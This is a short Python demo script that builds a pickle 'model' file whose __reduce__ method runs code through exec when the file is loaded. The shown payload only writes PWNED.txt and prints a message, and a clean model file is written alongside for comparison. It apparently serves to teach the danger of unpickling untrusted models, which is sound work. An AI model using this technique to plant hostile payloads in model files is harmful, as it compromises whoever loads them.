"""Build a HARMLESS 'malicious' model file to demonstrate pickle code execution.

The payload only prints a message and writes PWNED.txt in this folder.
python make_demo_pickle.py && python load_model_unsafely.py
"""
import pickle


class InnocentLookingModel:
    def __reduce__(self):
        # Runs on unpickle. A real attacker would use os.system / a reverse shell here.
        code = "open('PWNED.txt','w').write('code ran during model load\\n'); print('[!] payload executed on load')"
        return (exec, (code,))


weights = {"layer1": [0.1, 0.2, 0.3], "bias": 0.05}
with open("demo_model.pkl", "wb") as f:
    pickle.dump({"weights": weights, "meta": InnocentLookingModel()}, f)
with open("clean_model.pkl", "wb") as f:
    pickle.dump({"weights": weights}, f)
print("wrote demo_model.pkl (booby-trapped) and clean_model.pkl")
